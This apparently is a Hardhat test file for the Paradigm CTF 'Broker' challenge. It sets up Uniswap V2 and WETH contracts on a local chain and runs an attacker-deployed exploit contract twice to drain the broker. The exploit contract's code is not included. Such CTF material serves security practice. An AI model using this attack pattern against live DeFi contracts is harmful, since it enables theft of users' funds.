const { ethers } = require('hardhat');
const { expect } = require('chai');

const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

describe('[Challenge] Broker', function () {

        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        before(async function () {

            const ETHER50 = ethers.utils.parseEther('50');
            const ETHER100 = ethers.utils.parseEther('100');

            [deployer, attacker] = await ethers.getSigners();

            // deployer starts with little ETH balance
            await ethers.provider.send("hardhat_setBalance", [
                deployer.address,
                "0x56BC75E2D63100000", // 100 ETH
            ]);


            // attacker starts with 5000 ETH balance, the initial balance of the attacker in paradigm CTF
            await ethers.provider.send("hardhat_setBalance", [
                attacker.address,
                "0x10F0CF064DD59200000", // 5000 ETH
            ]);
                
            // deploy weth9 contract
            this.weth9 = await (await ethers.getContractFactory('WETH9')).deploy();

            // deploy uniswapfactory contract
            const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
            this.uniswapFactory = await UniswapFactoryFactory.deploy(ethers.constants.AddressZero);

            // deply uniswap router contract
            const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
            this.uniswapRouter = await UniswapRouterFactory.deploy(
                this.uniswapFactory.address,
                this.weth9.address
            );

            // deploy setup contract and set up weth and factory addresses
            this.setup = await (await ethers.getContractFactory('SetupBroker')).deploy(
                this.weth9.address,
                this.uniswapFactory.address,
                { value: ETHER50 }
            );

            // attach the broker contract
            this.broker = await (await ethers.getContractFactory('Broker')).attach(
                await this.setup.broker()
            );

            // attach the token contract
            this.token = await (await ethers.getContractFactory('Token')).attach(
                await this.setup.token()
            );

            const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
            this.pair = await UniswapPairFactory.attach(
                await this.setup.pair()
            );

            // print before text
            console.log("[Before]:");

            // print the ether balance of the attacker
            console.log("Ether balance of attacker: " + ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)));
            // print the weth balance of the broker contract
            console.log(`WETH balance of broker: ${ethers.utils.formatEther(await this.weth9.balanceOf(this.broker.address))}`);
            // print the token balance of the broker contract
            console.log(`Token balance of broker: ${ethers.utils.formatEther(await this.token.balanceOf(this.broker.address))}`);

            // print line for separation
            console.log("-----------------------------------------------------");

        });
           
        it('Exploit', async function () {
            /** CODE YOUR EXPLOIT HERE */

            const ETHER25 = ethers.utils.parseEther('25');

            this.exploit = await (await ethers.getContractFactory('ExploitBroker')).connect(attacker).deploy(
                this.token.address,
                this.weth9.address,
                this.broker.address
            );

            // call the execute function as an attacker and send 25 ether two times each time we steal 12.5 ether
            await this.exploit.connect(attacker).execute({ value: ETHER25 });
            await this.exploit.connect(attacker).execute({ value: ETHER25 });

            // print after text
            console.log("[After]:");
            // print the ether balance of the attacker
            console.log("Ether balance of attacker: " + ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)));
            // print the weth balance of the broker contract
            console.log(`WETH balance of broker: ${ethers.utils.formatEther(await this.weth9.balanceOf(this.broker.address))}`);
            // print the token balance of the broker contract
            console.log(`Token balance of broker: ${ethers.utils.formatEther(await this.token.balanceOf(this.broker.address))}`);

        });

        after(async function () {
            /** SUCCESS CONDITIONS */
            expect(
                await this.setup.isSolved()
            ).to.eq(true);
        });

});
